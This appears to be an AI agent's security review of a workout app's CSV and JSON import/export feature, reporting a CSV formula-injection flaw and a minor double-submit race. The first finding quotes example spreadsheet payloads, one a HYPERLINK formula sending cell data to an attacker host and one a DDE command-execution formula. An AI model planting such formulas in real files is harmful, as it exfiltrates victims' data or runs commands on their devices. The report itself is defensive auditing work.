## Findings

### [SEC-001] CSV export has no formula-injection guard - MEDIUM
**Category**: Injection (CSV/Formula injection, CWE-1236)
**Location**: `features/data-transfer/domain/csv.ts:30-35` (`encodeCsvField`)

**Reproduction**: `encodeCsvField` only quotes a field when it contains a comma, double quote, or `\r`/`\n` (RFC 4180's minimum quoting rule). It never checks whether a field's first character is `=`, `+`, `-`, or `@`. Every free-text field that flows into a CSV row - `session_title`, `plan`, `day`, `exercise`, `set_note`, `session_note` (`csvRowMapper.ts#mapSetToCsvRow`) - is 100% user-controlled (a workout/session title, a plan name, a set/session note). If a user names a session (or a plan, or a set note) something like `=HYPERLINK("http://attacker.example/?d="&A1,"open")` or `=cmd|'/c calc'!A1`, "Export workout log (CSV)" writes that string byte-for-byte, unescaped, into the file. Opening the result in Excel or Google Sheets with default settings executes it as a formula rather than displaying it as text.

This is not purely self-inflicted. The JSON/CSV **importer** accepts these same free-text fields with no content restriction beyond "is a string" (`exportSessionSchema`/`exportPlanSchema` in `exportEnvelopeSchema.ts` use bare `z.string()` for `title`/`notes`/`name`, and CSV import's `parseCsvDataRow` takes `session_title`/`set_note`/etc. verbatim). A crafted backup or CSV file shared as "try importing my plan" can plant a formula payload in a title/note field; the unsuspecting victim only has to later use the app's own "Export workout log (CSV)" feature and open the result in a spreadsheet for it to fire. This makes it a real import -> export round-trip attack chain, not just a self-XSS scenario.

**Impact**: Formula execution in the victim's spreadsheet application on their own device - ranges from data exfiltration (`=HYPERLINK`/`=WEBSERVICE`-style formulas phoning home with local data) to, on older Excel configurations with DDE still enabled, command execution. Standard, well-known CSV-injection impact (OWASP).

**Fix**: In `encodeCsvField` (`features/data-transfer/domain/csv.ts`), before the existing RFC 4180 quoting check, detect a leading `=`, `+`, `-`, or `@` and neutralize it - the standard mitigation is to prefix the field with a single quote (`'`) so spreadsheet applications render it as literal text instead of evaluating it, and force that field into the quoted branch so the leading `'` survives Excel's own re-parsing:
```ts
function encodeCsvField(value: string): string {
  const neutralized = /^[=+\-@]/.test(value) ? `'${value}` : value;
  if (/[",\r\n]/.test(neutralized)) {
    return `"${neutralized.replace(/"/g, '""')}"`;
  }
  return neutralized;
}
```
This changes exported file content only (the CSV encoder), not the JSON backup format or any DB write - safe to apply without touching import validation or `ExportEnvelopeV1`'s schema.

### [SEC-002] `TypedConfirmationGate`'s replace-import confirm button has no explicit in-flight guard beyond `Button`'s own `loading`-implies-`disabled` behavior - LOW
**Category**: Application Security (race condition / double-submission on a destructive action)
**Location**: `features/data-transfer/screens/DataImportPreviewScreen.tsx:225-233` (`TypedConfirmationGate` usage), `features/data-transfer/components/TypedConfirmationGate.tsx:76-84`

**Reproduction**: `TypedConfirmationGate`'s confirm button is disabled via `disabled={disabled || !isPhraseMatched}` and passed `loading={importJson.isPending}` from the screen. `components/ui/Button.tsx` does correctly fold `loading` into `isDisabled` (`const isDisabled = disabled || loading`), so once React has re-rendered with `isPending: true` the button is genuinely inert - this is a real gate, not merely cosmetic, and is not bypassable by a slow/normal double-tap. The residual gap is the same one this codebase has flagged as a standing, accepted pattern since P8/P9 (`reports/security-2026-08-11-p8.md`, `reports/security-2026-08-13-p9.md`): a fast double-tap landing inside the same event-loop tick, before the `useMutation` state update commits and React re-renders, can in principle fire `handleImportReplace()` twice before the first call's `isPending` flip is visible to the button.

**Impact**: Low, and non-corrupting for the reason those prior reports already established for this codebase: `ExpoSqlExecutor.transaction()` serializes on a single SQLite connection, so a second concurrent `importJson('replace', ...)` call's transaction simply queues behind the first rather than running concurrently. Because both calls import the identical file content, the second run is a same-file re-import against an already-replaced database - idempotent by `upsertRow`'s "newer `updated_at` wins" semantics (`SqliteDataTransferRepository.upsertRow`), so it purges and re-applies the same data rather than corrupting it. It does needlessly write a second pre-replace backup file to the cache directory. This is meaningfully lower-risk than P9's flagged case (`deleteSession`, a real irreversible no-undo hard delete with no file to fall back to) precisely because replace-import's own seatbelt - the automatic pre-replace backup - is unconditional and would have already been written before either call's purge ran.

**Fix**: Optional, matching this codebase's own established handling of the same pattern elsewhere (not previously required to block commit for `rebuild()`/`deleteSession`). If closed at all, the cheapest fix is a local `useRef` guard in `handleImportReplace`/`handleImportMerge` (`DataImportPreviewScreen.tsx`) that no-ops a call already in flight, independent of the `Button`'s own render-cycle-dependent `disabled` state.

## What was checked and found clean

- **Validation ordering (ADR-0013's hard rule)**: `DataTransferService.importJson` calls `this.parseJsonEnvelope(fileContent)` (`JSON.parse` -> `migrateExport` -> `exportEnvelopeV1Schema.safeParse`) before the pre-replace backup write and before the write transaction opens; `previewImportJson`/`previewImportCsv` are zero-write by construction. Every nested level of the envelope (`exportProfileSchema` through `exportProgressPhotoSchema`) has its own named Zod schema with no `.passthrough()` anywhere, so extra/adversarial keys (including `__proto__`-style keys) are stripped by Zod rather than propagated, and nothing in this feature spreads a parsed value onto a live object (`exportSettingSchema.value: z.unknown()` is only ever `JSON.stringify`'d into a DB text column via `jsonToSql`, never merged into a JS object). A malformed file (wrong types, non-object root, wrong `format`/`version` literal) fails with a specific, user-readable `InvalidExportFormatError`/`UnsupportedExportVersionError` before any DB write - verified by reading `migrateExport.ts` and `importJson`'s actual call order, not assumed from the doc comments.
- **SQL parameterization**: every query in `SqliteDataTransferRepository.ts` binds values as parameters; the only interpolated pieces are hardcoded table/column-name literals (`upsertRow`'s `table`/`columns` keys) and a `placeholders(count)` helper that only ever emits `?` characters - no parsed file content or CSV cell content reaches a SQL string via interpolation anywhere in this repository.
- **Replace-mode call ordering**: read `importJson`'s actual code (not the comment) - `writeBackupFile('pre-replace-backup')` is `await`ed and completes before `this.deps.db.transaction(...)` (which runs `purgeAllUserData` + all `upsert*` calls) ever starts; a throw from the backup write propagates immediately and no purge runs. The purge and every subsequent `upsert*` call for the same import run inside one shared `DatabaseContext.transaction()` (nested `tx`-scoped calls join the outer transaction rather than opening their own), so a failure partway through - e.g. an `ux_plan_single_active`/`ux_session_single_in_progress` constraint violation - rolls back the entire batch, leaving the database exactly as `purgeAllUserData` would have left it only if every write had failed, never half-purged. This matches ADR-0013's "a failed import leaves the database byte-identical" requirement.
- **Path traversal / filename handling**: `ExpoFileStorage.pathSegments()` (`services/files/ExpoFileStorage.ts:8-14`) already rejects any `.`/`..` path segment by throwing, a fix from this codebase's own P3 audit finding - re-verified present and unchanged in this diff. `DataImportScreen.tsx`'s staging path (`imports/.tmp-import-${Date.now()}-${asset.name}`) embeds the picked document's display name, which is attacker-influenceable in principle (a malicious content provider could set an arbitrary display name), but `pathSegments()` throws before any file operation if that name contains a literal `..`/`.` segment, and a `/`-containing name can only create nested paths *within* the `imports/` staging directory, never escape it. No export/import file path in this feature is built from session titles, exercise names, or note content - every export filename is `${prefix}-${epochMs}.{json,csv}` (`writeBackupFile`, `exportCsv`), fully app-generated.
- **CSV parser robustness**: `decodeCsv` (`domain/csv.ts`) is a linear single-pass character scanner with no regex-based backtracking risk - an unbalanced/unterminated quote just consumes the rest of the file into one field instead of hanging, and the end-of-input flush (`if (sawAnyFieldOnThisLine || field.length > 0 || row.length > 0)`) prevents a dropped final row. `parseCsvDataRow` returns `null` (a per-row warning) rather than throwing for a too-short row; a too-long row simply ignores extra columns. No pathological-input hang or crash found.
- **`expo-document-picker` usage**: read-only (`DocumentPicker.getDocumentAsync` with `copyToCacheDirectory: true`; nothing in this feature calls any write-capable DocumentPicker API). The `mimeTypes` filter passed to the picker is advisory only (OS-level, spoofable in principle) but is not the actual security boundary - real content validation is the Zod schema chain (JSON) / header-row + per-row parsing (CSV), both of which run and reject malformed content before any write, regardless of what MIME type the OS reported.
- **Dependency**: `expo-document-picker@57.0.1` (official Expo package) introduces zero new entries in `npm audit --audit-level=high`. `npm audit` shows 6 pre-existing high-severity findings (`@expo/metro`, `metro`, `metro-config`, `metro-transform-worker`, `fast-uri`, `image-size` - all dev/build-tooling transitives) and were confirmed present identically before this branch's changes (`git stash` + re-run) - unrelated to this diff, not a new finding, out of scope for this feature review.
- No secrets, credentials, or hardcoded keys in any reviewed file (`i18n/catalogs/en.ts` diff checked directly - translation strings only).
- `services/container.ts`/`navigation/routes.ts`/`app/profile/settings/_layout.tsx`/`features/data-transfer/index.ts` diffs are additive-only; the three new route wrappers (`app/profile/settings/{export,import,import-preview}.tsx`) are thin, matching this codebase's "no screen bodies in `app/`" rule, and presentation reaches the repository only through `DataTransferService` (no direct repository import from any screen/hook).

## Recommendations (priority order)
1. Fix SEC-001 (CSV formula-injection guard in `encodeCsvField`) before shipping "Export workout log (CSV)" - concrete, minimal, three-line change with no effect on the JSON backup format or import validation.
2. SEC-002 is optional and matches this codebase's own already-accepted risk posture for every other `ConfirmDialog`/typed-confirmation-gated mutation (P8/P9 precedent) - no action required unless the team wants to close the whole pattern codebase-wide in one pass.
3. No escalation to security-agent (Opus) warranted: no critical/high findings, no auth-architecture/crypto/compliance/cloud surface touched by this diff.
